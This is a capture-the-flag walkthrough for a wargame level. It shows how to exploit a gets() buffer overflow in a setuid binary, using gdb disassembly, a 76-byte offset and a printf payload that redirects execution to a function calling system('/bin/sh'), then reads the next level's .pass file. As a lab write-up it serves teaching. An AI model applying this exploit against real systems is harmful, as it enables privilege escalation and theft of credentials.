# Level 1


<br>

### >> [Flag file](./flag) <<

<br>

### >> [Source file](./source.c) <<

<br>


## TL;DR:

```bash
printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x44\x84\x04\x08\n' > /tmp/a
cat /tmp/a - | ./level1
```

And inside the program:
```bash
cat /home/user/level2/.pass
```

<br>


## Explanation:


#### Step 1:

- What's in the home directory:
```bash
ls -la
```

> ```
> total 17
> dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
> dr-x--x--x  1 root   root    340 Sep 23  2015 ..
> -rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
> -rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
> -rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
> -rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
> -rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
> ```


#### Step 2:

- Let's see what functions are in the `level1` binary:
```bash
gdb -q ./level1
info function
```

> ```asm
> All defined functions:
> 
> Non-debugging symbols:
> 0x080482f8  _init
> 0x08048340  gets
> 0x08048340  gets@plt
> 0x08048350  fwrite
> 0x08048350  fwrite@plt
> 0x08048360  system
> 0x08048360  system@plt
> 0x08048370  __gmon_start__
> 0x08048370  __gmon_start__@plt
> 0x08048380  __libc_start_main
> 0x08048380  __libc_start_main@plt
> 0x08048390  _start
> 0x080483c0  __do_global_dtors_aux
> 0x08048420  frame_dummy
> 0x08048444  run
> 0x08048480  main
> 0x080484a0  __libc_csu_init
> 0x08048510  __libc_csu_fini
> 0x08048512  __i686.get_pc_thunk.bx
> 0x08048520  __do_global_ctors_aux
> 0x0804854c  _fini
> ```
> We have 3 interessings functions:
> - frame_dummy
> - run
> - main

#### Step 3:


- Let's disassemble those functions:

```bash
disassemble frame_dummy
disassemble run
disassemble main
```

>```asm
> Dump of assembler code for function frame_dummy:
>    0x08048420 <+0>:   push   %ebp
>    0x08048421 <+1>:   mov    %esp,%ebp
>    0x08048423 <+3>:   sub    $0x18,%esp
>    0x08048426 <+6>:   mov    0x80496bc,%eax
>    0x0804842b <+11>:  test   %eax,%eax
>    0x0804842d <+13>:  je     0x8048441 <frame_dummy+33>
>    0x0804842f <+15>:  mov    $0x0,%eax
>    0x08048434 <+20>:  test   %eax,%eax
>    0x08048436 <+22>:  je     0x8048441 <frame_dummy+33>
>    0x08048438 <+24>:  movl   $0x80496bc,(%esp)
>    0x0804843f <+31>:  call   *%eax
>    0x08048441 <+33>:  leave  
>    0x08048442 <+34>:  ret    
>    0x08048443 <+35>:  nop
> End of assembler dump.
> ```
> Nothing to see here unfortunately, this function is not relevant for our purpose.
> ```
> Dump of assembler code for function run:
>    0x08048444 <+0>:   push   %ebp
>    0x08048445 <+1>:   mov    %esp,%ebp
>    0x08048447 <+3>:   sub    $0x18,%esp
>    0x0804844a <+6>:   mov    0x80497c0,%eax
>    0x0804844f <+11>:  mov    %eax,%edx
>    0x08048451 <+13>:  mov    $0x8048570,%eax
>    0x08048456 <+18>:  mov    %edx,0xc(%esp)
>    0x0804845a <+22>:  movl   $0x13,0x8(%esp)
>    0x08048462 <+30>:  movl   $0x1,0x4(%esp)
>    0x0804846a <+38>:  mov    %eax,(%esp)
>    0x0804846d <+41>:  call   0x8048350 <fwrite@plt>
>    0x08048472 <+46>:  movl   $0x8048584,(%esp)
>    0x08048479 <+53>:  call   0x8048360 <system@plt>
>    0x0804847e <+58>:  leave  
>    0x0804847f <+59>:  ret    
> End of assembler dump.
> ```
>
>  We can see that there are a call to the function `fwrite` and `system` with 0x8048584 (`/bin/sh`) in arg. It means that we can access this function and change the arguments to whatever we need.
>
> ```
> Dump of assembler code for function main:
>    0x08048480 <+0>:   push   %ebp
>    0x08048481 <+1>:   mov    %esp,%ebp
>    0x08048483 <+3>:   and    $0xfffffff0,%esp
>    0x08048486 <+6>:   sub    $0x50,%esp
>    0x08048489 <+9>:   lea    0x10(%esp),%eax
>    0x0804848d <+13>:  mov    %eax,(%esp)
>    0x08048490 <+16>:  call   0x8048340 <gets@plt>
>    0x08048495 <+21>:  leave  
>    0x08048496 <+22>:  ret    
> End of assembler dump.
> ```
> Here the `main` don't call `run` . But what is interesting is the function `gets`, who need a buffer to run. So if we can `overflow` this buffer with the addr of `run` this can solve our problem.
>


#### Step 4:

- calculate the offset to overflow the buffer and overwrite the return address with the address of `run` function:

with the site : [https://wiremask.eu/tools/buffer-overflow-pattern-generator/]
we can have a patern can be used to find the offset. The pattern is 200 bytes long and looks like this:
```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```
This will cause a segmentation fault, and we can use `gdb` to find the offset:
```bash
gdb -q level1
run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/level1/level1 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
```

and with `0x63413563` we have an offset of `76` bytes. So we can use this offset to overwrite the return address with the address of `run` function.

#### Step 5:

- Now we can create a payload to overwrite the return address with the address of `run` function. The address of `run` function is `0x08048444`. We can use `printf` to create the payload:

```bash
printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x44\x84\x04\x08\n' > /tmp/a
```
and then we can use `cat` to send the payload to the `level1` binary:

```bash
$> cat /tmp/a - | ./level1
cat /home/user/level2/.pass #this will be run by the system function
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

<br>

[[<<]](/level0/walkthrough.md) &nbsp; [[Back to main page]](/Readme.md) &nbsp; [[>>]](/level2/walkthrough.md)
